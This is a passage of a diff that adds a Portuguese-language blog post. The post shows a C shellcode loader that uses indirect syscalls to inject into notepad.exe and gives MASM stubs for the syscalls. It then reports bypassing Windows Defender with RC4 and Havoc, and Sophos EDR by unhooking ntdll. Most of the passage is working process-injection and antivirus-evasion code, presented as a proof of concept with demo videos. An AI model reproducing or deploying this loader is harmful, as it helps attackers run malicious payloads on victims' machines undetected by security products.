+	<span class="hljs-type">char</span> NotNtOpenProcessName[] = { <span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-number">0</span> };
+	<span class="hljs-type">char</span> NotNtAllocateVirtualMemoryName[] = { <span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-number">0</span> };
+	<span class="hljs-type">char</span> NotNtWriteVirtualMemoryName[] = { <span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-number">0</span> };
+	<span class="hljs-type">char</span> NotNtCreateThreadExName[] = { <span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-number">0</span> };
+	<span class="hljs-type">char</span> NotNtWaitForSingleObjectName[] = { <span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-number">0</span> };
+
+	SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
+	<span class="hljs-built_in">printf</span>(
+		<span class="hljs-string">&quot; _______           __ __                   __        _______                          __ __	\n&quot;</span>
+		<span class="hljs-string">&quot;|_     _|.-----.--|  |__|.----.-----.----.|  |_     |     __|.--.--.-----.----.---.-.|  |  |.-----.	\n&quot;</span>
+		<span class="hljs-string">&quot; _|   |_ |     |  _  |  ||   _|  -__|  __||   _|    |__     ||  |  |__ --|  __|  _  ||  |  ||__ --| \n&quot;</span>
+		<span class="hljs-string">&quot;|_______||__|__|_____|__||__| |_____|____||____|    |_______||___  |_____|____|___._||__|__||_____| \n&quot;</span>
+		<span class="hljs-string">&quot;                                                             |_____|                      	\n&quot;</span>  
+	);
+
+	SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;////////// CARREGANDO FUNCOES NT //////////\n\n&quot;</span>);
+
+	UINT_PTR pNtOpenProcess = (UINT_PTR)GetProcAddress(GetModuleHandleA(n_dll_name), NotNtOpenProcessName);
+	<span class="hljs-keyword">if</span> (pNtOpenProcess == <span class="hljs-number">0</span>) {
+		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
+		<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nErro: Nao foi possivel encontrar o endereco de NtOpenProcess\n&quot;</span>);
+		<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+	}
+	SSNtOpenProcess = ((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)(pNtOpenProcess + <span class="hljs-number">4</span>))[<span class="hljs-number">0</span>];
+	AddrNtOpenProcess = pNtOpenProcess + <span class="hljs-number">0x12</span>;
+	printAddressLetterByLetter(<span class="hljs-string">&quot;NtOpenProcess&quot;</span>, pNtOpenProcess, pNtOpenProcess + <span class="hljs-number">0x12</span>);
+
+	UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(GetModuleHandleA(n_dll_name), NotNtAllocateVirtualMemoryName);
+	<span class="hljs-keyword">if</span> (pNtAllocateVirtualMemory == <span class="hljs-number">0</span>) {
+		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
+		<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nErro: Nao foi possivel encontrar o endereco de NtAllocateVirtualMemory\n&quot;</span>);
+		<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+	}
+	SSNtAllocateVirtualMemory = ((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)(pNtAllocateVirtualMemory + <span class="hljs-number">4</span>))[<span class="hljs-number">0</span>];
+	AddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + <span class="hljs-number">0x12</span>;
+	printAddressLetterByLetter(<span class="hljs-string">&quot;NtAllocateVirtualMemory&quot;</span>, pNtAllocateVirtualMemory, pNtAllocateVirtualMemory + <span class="hljs-number">0x12</span>);
+
+	UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(GetModuleHandleA(n_dll_name), NotNtWriteVirtualMemoryName);
+	<span class="hljs-keyword">if</span> (pNtWriteVirtualMemory == <span class="hljs-number">0</span>) {
+		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
+		<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nErro: Nao foi possivel encontrar o endereco de NtWriteVirtualMemory\n&quot;</span>);
+		<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+	}
+	SSNtWriteVirtualMemory = ((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)(pNtWriteVirtualMemory + <span class="hljs-number">4</span>))[<span class="hljs-number">0</span>];
+	AddrNtWriteVirtualMemory = pNtWriteVirtualMemory + <span class="hljs-number">0x12</span>;
+	printAddressLetterByLetter(<span class="hljs-string">&quot;NtWriteVirtualMemory&quot;</span>, pNtWriteVirtualMemory, pNtWriteVirtualMemory + <span class="hljs-number">0x12</span>);
+
+	UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(GetModuleHandleA(n_dll_name), NotNtCreateThreadExName);
+	<span class="hljs-keyword">if</span> (pNtCreateThreadEx == <span class="hljs-number">0</span>) {
+		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
+		<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nErro: Nao foi possivel encontrar o endereco de NtCreateThreadEx\n&quot;</span>);
+		<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+	}
+	SSNtCreateThreadEx = ((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)(pNtCreateThreadEx + <span class="hljs-number">4</span>))[<span class="hljs-number">0</span>];
+	AddrNtCreateThreadEx = pNtCreateThreadEx + <span class="hljs-number">0x12</span>;
+	printAddressLetterByLetter(<span class="hljs-string">&quot;NtCreateThreadEx&quot;</span>, pNtCreateThreadEx, pNtCreateThreadEx + <span class="hljs-number">0x12</span>);
+
+	UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetProcAddress(GetModuleHandleA(n_dll_name), NotNtWaitForSingleObjectName);
+	<span class="hljs-keyword">if</span> (pNtWaitForSingleObject == <span class="hljs-number">0</span>) {
+		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
+		<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nErro: Nao foi possivel encontrar o endereco de NtWaitForSingleObject\n&quot;</span>);
+		<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+	}
+	SSNtWaitForSingleObject = ((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)(pNtWaitForSingleObject + <span class="hljs-number">4</span>))[<span class="hljs-number">0</span>];
+	AddrNtWaitForSingleObject = pNtWaitForSingleObject + <span class="hljs-number">0x12</span>;
+	printAddressLetterByLetter(<span class="hljs-string">&quot;NtWaitForSingleObject&quot;</span>, pNtWaitForSingleObject, pNtWaitForSingleObject + <span class="hljs-number">0x12</span>);
+
+	<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* processName = <span class="hljs-string">L&quot;notepad.exe&quot;</span>;
+	DWORD pid = GetProcessIdByName(processName);
+
+	HANDLE hProcess;
+	CLIENT_ID clientId = { <span class="hljs-number">0</span> };
+	clientId.UniqueProcess = (HANDLE)pid;
+	clientId.UniqueThread = <span class="hljs-literal">NULL</span>;
+
+	OBJECT_ATTRIBUTES objAttr;
+	InitializeObjectAttributes(&amp;objAttr, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);
+	SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[*] Pressione Enter para abrir processo alvo&quot;</span>);
+	(<span class="hljs-type">void</span>)getchar();
+	SetConsoleColor(FOREGROUND_BLUE | FOREGROUND_INTENSITY);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Abrindo Processo Alvo Com NtOpenProcess&quot;</span>);
+
+	NTSTATUS status = NtOpenProcess(&amp;hProcess, PROCESS_ALL_ACCESS, &amp;objAttr, &amp;clientId);
+	<span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) {
+		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
+		<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nFalha ao abrir o processo de destino NTSTATUS: 0x%08X\n&quot;</span>, status);
+		<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+	}
+	SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[*] Pressione Enter para alocar memoria no processo alvo&quot;</span>);
+	(<span class="hljs-type">void</span>)getchar();
+	SetConsoleColor(FOREGROUND_BLUE | FOREGROUND_INTENSITY);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Alocando Memoria Com NtAllocateVirtualMemory&quot;</span>);
+
+	NTSTATUS statusA = NtAllocateVirtualMemory(hProcess, &amp;allocBuffer, <span class="hljs-number">0</span>, &amp;shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	<span class="hljs-keyword">if</span> (!NT_SUCCESS(statusA)) {
+		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
+		<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nErro: Falha ao alocar memoria virtual. NTSTATUS: 0x%08X\n&quot;</span>, statusA);
+		<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+	}
+
+	SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[*] Pressione Enter para escrever na memoria no processo alvo&quot;</span>);
+	(<span class="hljs-type">void</span>)getchar();
+	SetConsoleColor(FOREGROUND_BLUE | FOREGROUND_INTENSITY);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Escrevendo Shellcode Com NtWriteVirtualMemory&quot;</span>);
+
+	SIZE_T bytesWritten;
+	NTSTATUS  statusW = NtWriteVirtualMemory(hProcess, allocBuffer, shellcode, shellcodeSize, &amp;bytesWritten);
+	<span class="hljs-keyword">if</span> (!NT_SUCCESS(statusW)) {
+		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
+		<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nErro: Falha ao escrever na memoria virtual. NTSTATUS: 0x%08X\n&quot;</span>, statusW);
+		<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+	}
+
+	SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[*] Pressione Enter para criar thread remota&quot;</span>);
+	(<span class="hljs-type">void</span>)getchar();
+	SetConsoleColor(FOREGROUND_BLUE | FOREGROUND_INTENSITY);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Criando Thread Remota Com NtCreateThreadEx&quot;</span>);
+
+	HANDLE hThread;
+	NTSTATUS statusT = NtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, <span class="hljs-literal">NULL</span>, hProcess, allocBuffer, <span class="hljs-literal">NULL</span>, FALSE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);
+	<span class="hljs-keyword">if</span> (!NT_SUCCESS(statusT)) {
+		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
+		<span class="hljs-built_in">fprintf</span>(<span class="hljs-string">&quot;\nFalha ao criar thread remoto. NTSTATUS: 0x%08X\n&quot;</span>, status);
+		CloseHandle(hThread);
+		<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+	}
+	SetConsoleColor(FOREGROUND_BLUE | FOREGROUND_INTENSITY);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[!] Aguardando Thread Completar Com NtWaitForSingleObject&quot;</span>);
+	SetConsoleTextAttribute(hConsole, <span class="hljs-number">7</span>);
+	NtWaitForSingleObject(hThread, FALSE, <span class="hljs-literal">NULL</span>);
+	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</pre>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Agora nosso
+              código asm</h2>
+            <p><span style="color: #9E2525;">Extern</span> Indica que o símbolo é definido em outro módulo.<br><span
+                style="color: #9E2525;">SSNtOpenProcess:DWORD</span> É o Número de syscall para <span
+                style="color: #9E2525;">NtOpenProcess</span>.<br>Obtemos o número SSN de uma possível função
+              <strong>NTAPI</strong> lendo o valor no deslocamento <span style="color: #9E2525;">0x4</span> no stub de
+              montagem da referida função:<br><br>
+            </p>
+            <pre
+              style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">SSNtOpenProcess = ((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)(pNtOpenProcess + <span class="hljs-number">4</span>))[<span class="hljs-number">0</span>];
+</pre>
+            <br>
+            <p><span style="color: #9E2525;">AddrNtOpenProcess</span> É o endereço real da instrução
+              <strong>syscall</strong> de <span style="color: #9E2525;">NtOpenProcess</span> em <span
+                style="color: #9E2525;">ntdll.dll</span>.<br>Obtemos o endereço da instrução <strong>syscall</strong>
+              adicionando <span style="color: #9E2525;">0x12</span> ao endereço de <span
+                style="color: #9E2525;">pNtOpenProcess</span><br><br>
+            </p>
+            <pre
+              style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">AddrNtOpenProcess = pNtOpenProcess + <span class="hljs-number">0x12</span>;
+</pre>
+            <br>
+            <p><span style="color: #9E2525;">jmp QWORD PTR [AddrNtOpenProcess]</span> É um salto incondicional, ela vai
+              pular para o endereço <span style="color: #9E2525;">AddrNtOpenProcess</span> que vai ser o endereço da
+              instrução <strong>syscall</strong> de <span style="color: #9E2525;">NtOpenProcess</span> em <span
+                style="color: #9E2525;">ntdll.dll</span>.</p>
+            <br>
+            <pre
+              style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">EXTERN SSNtOpenProcess:DWORD               
+EXTERN AddrNtOpenProcess:QWORD  
+
+EXTERN SSNtAllocateVirtualMemory:DWORD               
+EXTERN AddrNtAllocateVirtualMemory:QWORD       
+
+EXTERN SSNtWriteVirtualMemory:DWORD                  
+EXTERN AddrNtWriteVirtualMemory:QWORD            
+
+EXTERN SSNtCreateThreadEx:DWORD                      
+EXTERN AddrNtCreateThreadEx:QWORD                
+
+EXTERN SSNtWaitForSingleObject:DWORD                
+EXTERN AddrNtWaitForSingleObject:QWORD          
+
+.CODE
+
+NtOpenProcess PROC
+    mov r10, rcx
+    mov eax, SSNtOpenProcess
+    jmp QWORD PTR [AddrNtOpenProcess]
+NtOpenProcess ENDP
+
+
+NtAllocateVirtualMemory PROC
+    mov r10, rcx
+    mov eax, SSNtAllocateVirtualMemory
+    jmp QWORD PTR [AddrNtAllocateVirtualMemory]
+NtAllocateVirtualMemory ENDP
+
+
+NtWriteVirtualMemory PROC
+    mov r10, rcx
+    mov eax, SSNtWriteVirtualMemory
+    jmp QWORD PTR [AddrNtWriteVirtualMemory]
+NtWriteVirtualMemory ENDP
+
+
+NtCreateThreadEx PROC
+    mov r10, rcx
+    mov eax, SSNtCreateThreadEx
+    jmp QWORD PTR [AddrNtCreateThreadEx]
+NtCreateThreadEx ENDP
+
+
+NtWaitForSingleObject PROC
+    mov r10, rcx
+    mov eax, SSNtWaitForSingleObject
+    jmp QWORD PTR [AddrNtWaitForSingleObject]
+NtWaitForSingleObject ENDP
+
+END  
+</pre>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Prova de
+              conceito:</h2>
+            <p>Note que o primeiro executável que testamos é um loader que utiliza APIs <strong>NT</strong> mas não faz
+              uso de <strong>syscalls indiretas</strong>. Já o segundo executável é o loader que, de fato, faz uso de
+              <strong>syscalls indiretas</strong>.<br><br>
+            </p>
+            <div align="center">
+              <iframe width="980" height="615" src="https://www.youtube.com/embed/7MwtfqRqqCA" frameborder="0"
+                allowfullscreen></iframe>
+            </div>
+            <br>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Detecção</h2>
+            <p>Obtive 5 detecções no <a href="https://virustotal.com/" href="https://virustotal.com/"
+                style="color: #9E2525;">VirusTotal</a>. Não está muito bom, mas dá para melhorar:</p>
+            <p><img src="https://i.imgur.com/DrCcvnf.png" alt=""
+                style="max-width: 100%; height: auto; width: 600px; display: block; margin: 20px auto;"></p>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Contra Windows
+              Defender</h2>
+            <p>O <strong>Windows Defender</strong> não foi grande coisa, conseguimos contorná-lo facilmente. Apenas
+              apliquei<br>descriptografia <strong>RC4</strong>, que já foi abordada em um post anterior, e fiz uso do <a
+                href="https://havocframework.com/" href="https://havocframework.com/"
+                style="color: #9E2525;">Havoc</a>.<br>Lembrando que este código ainda tem muito espaço para melhorar.
+            </p>
+            <br>
+            <div align="center">
+              <iframe width="980" height="615" src="https://www.youtube.com/embed/btTFZzf0yPs" frameborder="0"
+                allowfullscreen></iframe>
+            </div>
+            <br>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Contra Sophos
+              EDR</h2>
+            <p>Bom, eu fiz esse post há cerca de uma semana, e como estou livre, sem nada para fazer, decidi realizar
+              mais um teste com o código de <em>indirect syscalls</em>. Decidi ver como ele se sairia contra o <a
+                href="https://www.sophos.com/pt-br/products/endpoint-antivirus/edr"
+                href="https://www.sophos.com/pt-br/products/endpoint-antivirus/edr" style="color: #9E2525;">SOPHOS</a>.
+              De início, percebi que, sem realizar o <em>unhooking</em> da <span style="color: #9E2525;">ntdll</span>,
+              não seria possível nem passar da parte de alocação de memória. Então, decidi utilizar um código simples
+              para realizar o <em>unhooking</em> da <span style="color: #9E2525;">ntdll.dll</span> e verificar se
+              conseguiria prosseguir com sua execução normalmente. E este foi o resultado:</p>
+            <br>
+            <div align="center">
+              <iframe width="980" height="615" src="https://www.youtube.com/embed/N3p4A1jh_4I" frameborder="0"
+                allowfullscreen></iframe>
+            </div>
+          </div>
+        </article>
+      </div>
+    </main>
+    <footer style="background-color: rgba(27, 27, 27, 0.7); text-align: center; padding: 5px 0;">
+      <h6 style="color: rgba(255, 255, 255, 0.4) !important;">Copyright © Vithor 2023/2024</h6>
+    </footer>
+    <script>
+      function isMobileDevice() {
+        return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|Windows Phone/i.test(navigator.userAgent);
+      }
+
+      if (isMobileDevice()) {
+        alert("Este site não é compatível com dispositivos móveis. Você será redirecionado para o Google.");
+        window.location.href = "https://www.google.com";
+      }
+    </script>
+  </body>
+
+</html>
